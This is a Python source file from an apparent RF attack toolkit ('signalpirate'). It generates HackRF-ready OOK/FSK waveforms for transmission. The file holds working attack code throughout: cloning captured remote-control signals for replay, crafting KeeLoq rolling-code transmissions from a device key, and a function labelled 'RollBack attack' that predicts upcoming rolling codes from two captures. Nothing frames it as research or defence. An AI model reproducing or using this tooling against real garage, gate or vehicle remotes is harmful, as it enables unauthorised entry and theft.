"""
Payload Generator — Create TX-ready waveforms from captured/crafted signals.

Supports:
  - OOK/FSK IQ file generation (.cs8 format for hackrf_transfer/URH)
  - KeeLoq rolling code generation with keystore
  - Signal cloning with field modification
  - RollBack attack code prediction
  - Manchester and PWM encoding
"""
import math
import os
import struct
import time
import logging
from typing import Optional, List

logger = logging.getLogger("signalpirate.payload_generator")


class PayloadGenerator:
    """Generate TX-ready IQ waveforms for HackRF transmission."""

    def __init__(self, sample_rate: int = 2_000_000):
        self.sample_rate = sample_rate

    # ── IQ Waveform Generation ──────────────────────────

    def generate_ook_iq(self, bitstream: str, symbol_rate: int, output_path: str) -> str:
        """Generate OOK (On-Off Keying) IQ waveform as .cs8 file."""
        samples_per_symbol = max(1, self.sample_rate // symbol_rate)

        with open(output_path, "wb") as f:
            for bit in bitstream:
                if bit == "1":
                    symbol = struct.pack("bb", 127, 0) * samples_per_symbol
                else:
                    symbol = struct.pack("bb", 0, 0) * samples_per_symbol
                f.write(symbol)

        logger.info(f"OOK IQ: {len(bitstream)} bits → {output_path}")
        return output_path

    def generate_fsk_iq(self, bitstream: str, symbol_rate: int, deviation: int, output_path: str) -> str:
        """Generate FSK (Frequency Shift Keying) IQ waveform as .cs8 file."""
        samples_per_symbol = max(1, self.sample_rate // symbol_rate)
        up_inc = 2.0 * math.pi * deviation / self.sample_rate
        down_inc = -up_inc
        phase = 0.0

        with open(output_path, "wb") as f:
            for bit in bitstream:
                inc = up_inc if bit == "1" else down_inc
                for _ in range(samples_per_symbol):
                    i_val = max(-128, min(127, int(127 * math.cos(phase))))
                    q_val = max(-128, min(127, int(127 * math.sin(phase))))
                    f.write(struct.pack("bb", i_val, q_val))
                    phase = (phase + inc) % (2.0 * math.pi)

        logger.info(f"FSK IQ: {len(bitstream)} bits → {output_path}")
        return output_path

    def generate_from_pulses(self, pulses: list, output_path: str) -> str:
        """Generate IQ from raw pulse pairs [{level: bool, duration_us: int}, ...]."""
        with open(output_path, "wb") as f:
            for pulse in pulses:
                duration_samples = max(1, int(pulse["duration_us"] * self.sample_rate / 1_000_000))
                if pulse.get("level", False):
                    chunk = struct.pack("bb", 127, 0) * duration_samples
                else:
                    chunk = struct.pack("bb", 0, 0) * duration_samples
                f.write(chunk)

        logger.info(f"Pulse IQ: {len(pulses)} pulses → {output_path}")
        return output_path

    # ── Signal Encoding ─────────────────────────────────

    @staticmethod
    def manchester_encode(data: bytes) -> str:
        """Manchester encode bytes (0 → '01', 1 → '10')."""
        bits = []
        for byte in data:
            for i in range(8):
                bit = (byte >> (7 - i)) & 1
                bits.append("10" if bit else "01")
        return "".join(bits)

    @staticmethod
    def pwm_encode(data: bytes, zero_pulse: str = "100", one_pulse: str = "110") -> str:
        """PWM encode bytes. Default: 0='100', 1='110'."""
        bits = []
        for byte in data:
            for i in range(8):
                bit = (byte >> (7 - i)) & 1
                bits.append(one_pulse if bit else zero_pulse)
        return "".join(bits)

    @staticmethod
    def bits_to_bytes(bitstring: str) -> bytes:
        """Convert a binary string to bytes (padded to 8 bits)."""
        padded = bitstring + "0" * ((8 - len(bitstring) % 8) % 8)
        return bytes(int(padded[i:i+8], 2) for i in range(0, len(padded), 8))

    # ── High-Level Payload Crafting ─────────────────────

    def craft_keeloq_payload(
        self,
        serial: int,
        counter: int,
        button: int,
        device_key: int,
        frequency: int = 433_920_000,
        output_dir: str = "/tmp",
    ) -> dict:
        """Craft a complete KeeLoq TX payload."""
        from backend.protocols.keeloq import KeeLoq

        tx_bits = KeeLoq.generate_transmission(counter, serial, button, device_key)
        pwm_stream = self.pwm_encode(self.bits_to_bytes(tx_bits))

        # Add preamble (10 x '10') and sync
        preamble = "10" * 10
        full_stream = preamble + pwm_stream

        ts = int(time.time())
        filename = f"keeloq_{serial:06X}_c{counter}_{ts}.cs8"
        output_path = os.path.join(output_dir, filename)
        self.generate_ook_iq(full_stream, 2000, output_path)

        return {
            "file": output_path,
            "bits": tx_bits,
            "frequency": frequency,
            "serial": serial,
            "counter": counter,
            "button": button,
        }

    def craft_replay_payload(
        self,
        signal_data: dict,
        output_dir: str = "/tmp",
    ) -> dict:
        """Clone a captured signal into a TX-ready .cs8 file."""
        pulses = signal_data.get("pulses", [])
        if not pulses:
            # Generate from hex data if available
            data_hex = signal_data.get("data", "")
            if isinstance(data_hex, str) and len(data_hex) >= 2:
                hex_clean = data_hex.replace("0x", "")
                try:
                    bits = bin(int(hex_clean, 16))[2:]
                except ValueError:
                    bits = "10" * 20  # Fallback test pattern
                pulses = []
                for bit in bits:
                    if bit == "1":
                        pulses.append({"level": True, "duration_us": 500})
                        pulses.append({"level": False, "duration_us": 250})
                    else:
                        pulses.append({"level": True, "duration_us": 250})
                        pulses.append({"level": False, "duration_us": 500})
                pulses.append({"level": False, "duration_us": 10000})  # Gap

        model = signal_data.get("model", "unknown").replace(" ", "_")[:20]
        ts = int(time.time())
        filename = f"replay_{model}_{ts}.cs8"
        output_path = os.path.join(output_dir, filename)

        if pulses:
            self.generate_from_pulses(pulses, output_path)
        else:
            # Generate a test pattern
            test_bits = "10" * 50
            self.generate_ook_iq(test_bits, 2000, output_path)

        return {
            "file": output_path,
            "frequency": signal_data.get("freq", signal_data.get("frequency", 433_920_000)),
            "model": signal_data.get("model", "Unknown"),
        }

    def craft_rollback_codes(
        self,
        capture1_hex: str,
        capture2_hex: str,
        count: int = 5,
    ) -> List[str]:
        """
        RollBack attack: predict next N rolling codes from two captures.
        Finds the counter window and extrapolates.
        """
        try:
            c1 = bin(int(capture1_hex.replace("0x", ""), 16))[2:]
            c2 = bin(int(capture2_hex.replace("0x", ""), 16))[2:]
        except ValueError:
            return []

        # Pad to same length
        max_len = max(len(c1), len(c2))
        c1 = c1.zfill(max_len)
        c2 = c2.zfill(max_len)

        # Find contiguous changed bits (the counter)
        diff = [i for i in range(max_len) if c1[i] != c2[i]]
        if not diff:
            return []

        start, end = diff[0], diff[-1]
        counter_len = end - start + 1

        v1 = int(c1[start:end+1], 2)
        v2 = int(c2[start:end+1], 2)
        stride = v2 - v1 if v2 != v1 else 1
        mask = (1 << counter_len) - 1

        results = []
        current = v2
        for _ in range(count):
            current = (current + stride) & mask
            new_bits = format(current, f"0{counter_len}b")
            predicted = c2[:start] + new_bits + c2[end+1:]
            results.append(hex(int(predicted, 2)))

        return results
